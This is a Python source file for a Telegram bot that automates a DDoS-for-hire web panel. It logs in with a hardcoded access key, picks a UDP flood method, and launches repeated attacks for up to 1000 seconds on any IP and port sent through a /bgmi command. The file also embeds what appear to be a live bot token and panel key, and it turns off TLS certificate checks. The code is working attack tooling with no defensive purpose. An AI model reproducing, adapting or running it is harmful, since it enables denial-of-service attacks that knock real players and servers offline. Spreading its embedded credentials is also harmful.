import asyncio
import time
import threading
import ssl
import urllib3
import os
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# SSL Fix
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TOKEN = "8947172357:AAEm-XyXU-B5TV1xcZoOIZJMmk8KQQXQXQM"
ALLOWED_GROUP_ID = -5518975872

is_attacking = False
stop_attack = False
driver = None
is_logged_in = False

ACCESS_KEY = "687bdda5c85a487bbac4082523058bc518ca1eb6f4dc4b5cbcc38f30c2491d1e"

def close_browser():
    global driver
    if driver:
        try:
            driver.quit()
        except:
            pass
        driver = None

def init_browser():
    global driver
    close_browser()
    
    try:
        import certifi
        os.environ.setdefault('SSL_CERT_FILE', certifi.where())
    except:
        pass
    
    options = uc.ChromeOptions()
    options.add_argument("--start-maximized")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-gpu")
    options.add_argument("--ignore-certificate-errors")
    options.add_argument("--ignore-ssl-errors")
    options.add_argument("--disable-dev-shm-usage")
    
    driver = uc.Chrome(options=options, version_main=150, use_subprocess=True)
    return driver

def full_login_setup():
    global driver, is_logged_in
    try:
        print("🔄 Engine chalu hora ...")
        drv = init_browser()
        wait = WebDriverWait(drv, 30)
        
        drv.get("https://retrostress.st/auth")
        time.sleep(8)
        
        key_field = wait.until(EC.presence_of_element_located((By.ID, "accessKey")))
        key_field.clear()
        key_field.send_keys(ACCESS_KEY)
        
        auth_btn = wait.until(EC.element_to_be_clickable((By.ID, "loginSubmitBtn")))
        auth_btn.click()
        time.sleep(12)
        
        drv.get("https://retrostress.st/panel")
        time.sleep(10)
        
        udp_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'UDP')]")))
        udp_btn.click()
        time.sleep(5)
        
        trigger = wait.until(EC.element_to_be_clickable((By.CLASS_NAME, "ct-combo-trigger")))
        trigger.click()
        time.sleep(4)
        
        big_btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'UDP-BIG')]")))
        big_btn.click()
        time.sleep(4)
        
        is_logged_in = True
        print("✅ Engine chalu hogya")
        return True
    except Exception as e:
        print("Setup Error:", str(e))
        is_logged_in = False
        return False

def launch_attack(ip, port):
    try:
        wait = WebDriverWait(driver, 20)
        ip_field = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input.ct-input")))
        ip_field.clear()
        ip_field.send_keys(ip)
        
        port_field = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='number']")))
        port_field.clear()
        port_field.send_keys(str(port))
        
        btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button.ct-launch, button.btn-primary")))
        btn.click()
        time.sleep(2)
        return True
    except Exception as e:
        print("Launch error:", str(e))
        return False

def run_attacks(ip, port, duration_seconds, chat_id, bot, loop):
    global is_attacking, stop_attack
    stop_attack = False
    try:
        num_attacks = max(1, duration_seconds // 30)
        for i in range(num_attacks):
            if stop_attack:
                send_message_threadsafe(bot, chat_id, "🛑 Attack Stopped", loop)
                break
            send_message_threadsafe(bot, chat_id, f"🔄 Attack {i+1}/{num_attacks} → {ip}:{port}", loop)
            launch_attack(ip, port)
            start = time.time()
            while time.time() - start < 30:
                time.sleep(0.5)
                if stop_attack:
                    break
    finally:
        is_attacking = False

def send_message_threadsafe(bot, chat_id, text, loop):
    try:
        future = asyncio.run_coroutine_threadsafe(bot.send_message(chat_id=chat_id, text=text), loop)
        future.result(timeout=10)
    except:
        pass

# ===================== COMMANDS =====================
async def start_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
🚀 **Welcome bro **

**Commands:**
• `/bgmi <ip> <port>` → Start Attack
• `/stop` → Stop Current Attack
• `/restart` → Restart Browser + Login
• `/help` → Show this menu

**Features:**
• Auto Login + UDP-BIG
• Real-time Status
• DEV: @LFX_Noxis
"""
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attacking
    if update.message.chat.id != ALLOWED_GROUP_ID:
        return
    if is_attacking:
        await update.message.reply_text("⏳ Attack already running! Use /stop")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /bgmi <ip> <port>")
        return

    ip = context.args[0]
    port = context.args[1]

    keyboard = [
        [InlineKeyboardButton("100 Sec", callback_data=f"atk_{ip}_{port}_100")],
        [InlineKeyboardButton("200 Sec", callback_data=f"atk_{ip}_{port}_200")],
        [InlineKeyboardButton("400 Sec", callback_data=f"atk_{ip}_{port}_400")],
        [InlineKeyboardButton("700 Sec", callback_data=f"atk_{ip}_{port}_700")],
        [InlineKeyboardButton("1000 Sec", callback_data=f"atk_{ip}_{port}_1000")]
    ]

    await update.message.reply_text(
        f"⚔️ **New Attack Ready**\n"
        f"🎯 Target: `{ip}:{port}`\n"
        f"Choose Duration:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attacking
    query = update.callback_query
    await query.answer()
    if query.data.startswith("atk_"):
        if is_attacking:
            await query.edit_message_text("Already running!")
            return
        _, ip, port, dur = query.data.split("_")
        duration = int(dur)
        is_attacking = True
        await query.edit_message_text(f"🚀 Launching {duration}s attack on {ip}:{port}...")
        loop = asyncio.get_running_loop()
        threading.Thread(target=run_attacks, args=(ip, port, duration, query.message.chat_id, context.bot, loop), daemon=True).start()

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_attack
    if not is_attacking:
        await update.message.reply_text("❌ No attack is running.")
        return
    stop_attack = True
    await update.message.reply_text("🛑 Stopping current attack...")

async def restart_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attacking, is_logged_in
    if is_attacking:
        await update.message.reply_text("⏳ Cannot restart during attack.")
        return
    is_logged_in = False
    success = full_login_setup()
    if success:
        await update.message.reply_text("✅ **Restart hogya hai**")
    else:
        await update.message.reply_text("❌ Restart failed.")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start_help))
    app.add_handler(CommandHandler("help", start_help))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("stop", stop_command))
    app.add_handler(CommandHandler("restart", restart_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    print("🤖 Bot Started Successfully! Use /help")
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        app.run_polling()
    finally:
        loop.close()

if __name__ == "__main__":
    print("🔧 Starting Bot...")
    full_login_setup()
    main()
